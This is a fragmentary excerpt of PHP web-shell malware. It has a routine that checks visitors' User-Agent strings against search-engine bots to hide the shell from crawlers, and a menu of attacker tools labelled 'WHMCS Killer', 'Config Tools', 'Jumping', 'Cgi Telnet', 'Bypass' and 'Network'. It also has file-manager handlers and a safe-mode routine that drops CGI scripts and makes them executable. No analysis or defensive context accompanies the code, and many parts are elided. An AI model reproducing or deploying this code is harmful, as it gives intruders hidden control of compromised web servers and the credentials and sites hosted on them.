...
function hardLogin() {
                if(!empty($_SERVER['HTTP_USER_AGENT'])) {
                  $userAgents = array("AbachoBOT", "accoona", "AcoiRobot", "AltaVista robot", "ASPSeek", "bot", "crawler", "CrocCrawler", "curl", "Dumbot", "eStyle Bot", "facebook", "FAST-WebCrawler", "fetch", "GeonaBot", "Gigabot", "Google", "Googlebot", "ia_archiver", "ID-Search Bot", "Lycos spider", "MSN", "MSNBot", "MSRBOT", "Rambler", "Scrubby robot", "Slurp", "spider", "Yahoo", "Yandex");
...
<style>
    ...
    $m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Adminer'=>'Adminer','Console'=>'Console','Mail Test'=>'mailtest','WHMCS Killer'=>'whmcs','Config Tools'=>'configs','Jumping'=>'Jumping','Cgi Telnet'=>'SafeMode','Bypass'=>'Bypass','Network'=>'Network','Domains' => 'Domain');
    ...
    echo '<div><table class="info" cellpadding="0" cellspacing="0" width="100%"><tr>
         ...
         '</div></div><div style="margin:5;"><div class="content" style="padding:3px;"><table cellpadding="3" cellspacing="0" width="100%" class="menu"><tr>'.$menu.'</tr></table></div></div><div style="margin:5;">';
}
        ...
        case 'mkfile':
            ...
            break;
                case 'unzip':
                     ...
                     $zip->close();
                     $GLOBALS['status'] = array('success' => '<b style="font-size: 20px;background:green;text-shadow: 0px 0px;">File unzipped successfully</b>');}
                     else {$GLOBALS['status'] = array('error' => '<b style="font-size: 20px;background:red;text-shadow: 0px 0px;">Error unzipping file</b>');}}
                     echo '<center>'; echo reset($GLOBALS['status']); echo'<br/></p></center>';
            break;
    }
    echo '</div>';
    printFooter();
...
function actionSafeMode() {
    ...
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
        ...
        if(file_exists('cgi.new')) {
                ...
                chmod($file_cgi, 0755);chmod($memeg, 0755);
                printFooter();die;
        } else {
